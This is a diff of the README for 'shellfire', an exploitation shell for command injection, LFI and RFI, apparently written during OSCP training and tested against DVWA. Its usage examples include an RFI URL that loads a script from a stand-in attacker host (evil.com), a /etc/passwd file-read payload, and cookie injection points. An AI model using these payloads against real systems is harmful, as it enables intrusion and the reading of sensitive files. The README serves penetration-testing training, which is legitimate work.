@@ -1,42 +1,88 @@
 # shellfire
 
-_shellfire_ is an exploitation shell which focuses on exploiting LFI, RFI, and command injection vulnerabilities.
+_shellfire_ is an exploitation shell which focuses on exploiting command injection vulnerabilities. This can be useful when exploiting LFI, RFI, SSTI, etc.
 
-Recently, I received some inspiration while working on my OSCP labs. I accidentally ended up writing this script, and it ended up helping me pwn a number of boxes in the labs.
+I originally started developing this script while working on my OSCP labs. As the capabilities grew, I thought maybe other people could find this as 
+useful as I have, so I decided to open source my tool.
 
-Now that my labs are finished, I thought maybe other people could find this as useful as I have, so I decided to open source my tool.
+## Features  
+
+- [X] Persistent named configuration for multiple targets (and sharing!)  
+- [X] Plugin system  
+- [X] PHP payload  
+- [X] ASP payload  
+
+
+## Installation  
+
+Run `pip install -r requirements.txt` to install the application dependencies.  
+
 
 ## A few useful hints
 
-To use shellfire, just fire it up via python (or add execute permissions and launch it directly). For example:
+To use shellfire, just fire it up via python (or add execute permissions and 
+launch it directly). For example:
 
 ```
 $ python shellfire.py
-[*] ShellFire v0.1
+[*] ShellFire v0.8
 [*] Type '.help' to see available commands
 >>
 ```
 
-You can type `.help` at any time for a list of available commands, or append the command you want to know more information about to help for specific details. For example `.help http`.
+You can type `.help` at any time for a list of available commands, or append 
+the command you want to know more information about to help for specific 
+details. For example `.help .http`.
 
-To start exploitation, you need to specify at least the URL of your target. Something like the following should work:
+Let's explore how to attack a basic RFI vulnerability!
+
+To start exploitation, you need to specify at least the URL parameter of your target. 
+Something like the following should work:
 
 ```
 >> .url http://example.com/?path=http://evil.com/script.php
 ```
 
-At this point, you should have enough to exploit easy vulnerabilities. You can simply start executing commands and they will be sent over to the target.
+Running any command now would cause your RFI to get executed on the remote target.
 
-For more complex vulnerabilities, you may need to specify additional options. To exemplify, let's assume you needed to send a cookie with a session ID in order to exploit your target. You may want to add something like this:
+Let's say you want to arbitrarily control the payloads going to the path paramter. This time, we will use `{}` to specify our injection point.
+
+```
+>> .url http://example.com/?path={}
+```
+
+Now, you can just type the payload you want to send and hit enter.
+
+```
+>> /etc/passwd
+```
+
+At this point, you should have enough to exploit easy vulnerabilities. Payloads you enter on the shell will be appropriately injected and sent over to your target.
+
+More complex vulnerabilities may require specifying additional options. 
+For example, let's assume you needed to send a cookie with a session ID in 
+order to exploit your target. You may want to add something like this:
 
 ```
 >> .cookies { "session_id" : "123456789" }
 ```
 
-Additional options, and information on how to use them, can be discovered by using the `.help` option in the shell.
+We can specify injection points in cookies too.
+
+```
+>> .cookies { "session_id" : "123456789", "vuln_param": "{}" }
+```
+
+Additional options, and information on how to use them, can be discovered by 
+using the `.help` option in the shell.
 
 Thanks to Offensive-Security for inspiring the creation of this utility.
 
 Please use this tool for good.
 
 Happy hacking!
+
+
+## Testing  
+
+Testing is currently being done against the [dvwa docker image](https://hub.docker.com/r/vulnerables/web-dvwa/).
